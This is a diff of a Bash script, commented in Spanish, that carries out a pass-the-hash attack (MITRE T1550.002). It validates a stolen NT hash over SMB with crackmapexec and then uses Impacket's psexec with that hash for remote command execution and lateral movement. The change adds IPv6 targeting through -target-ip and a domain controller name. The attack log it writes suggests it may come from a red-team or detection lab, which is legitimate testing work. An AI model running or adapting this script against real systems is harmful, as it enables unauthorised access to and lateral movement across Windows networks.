@@ -20,14 +20,16 @@ else
   FULLHASH="aad3b435b51404eeaad3b435b51404ee:${NTHASH}"
 fi
 # crackmapexec / netexec para validar el hash vía SMB
-# Dual-stack: Impacket/cme aceptan IPv6; el host se pasa entre corchetes en la
-# forma user@[IPv6]. crackmapexec recibe la direccion tal cual.
+# Dual-stack: con un objetivo IPv6, Impacket no resuelve 'user@[IPv6]'. Se usa
+# -target-ip con la IPv6 y el nombre del DC para la sesion SMB.
+PS_TIP=(); PS_HOST="${TARGET}"
+if es_ipv6 "$TARGET"; then PS_TIP=(-target-ip "$TARGET"); PS_HOST="dc-empresa"; fi
 if command -v crackmapexec &>/dev/null; then
-  crackmapexec smb "${TARGET}" -u "${USER}" -H "${NTHASH}" || true
+  crackmapexec smb "${PS_HOST}" -u "${USER}" -H "${NTHASH}" || true
 fi
 # psexec.py de Impacket para ejecucion remota (movimiento lateral)
 if command -v impacket-psexec &>/dev/null; then
-  echo "whoami" | timeout 20 impacket-psexec -hashes "${FULLHASH}" "${USER}@$(brk "$TARGET")" 2>&1 | tee "/tmp/pth_$(date +%s).log" || true
+  echo "whoami" | timeout 20 impacket-psexec "${PS_TIP[@]}" -hashes "${FULLHASH}" "${USER}@${PS_HOST}" 2>&1 | tee "/tmp/pth_$(date +%s).log" || true
 fi
 log_fin "pass_the_hash" "T1550.002" "${TARGET}" "${INICIO}" "1"
 echo "[+] Ataque registrado en log_ataques.csv"
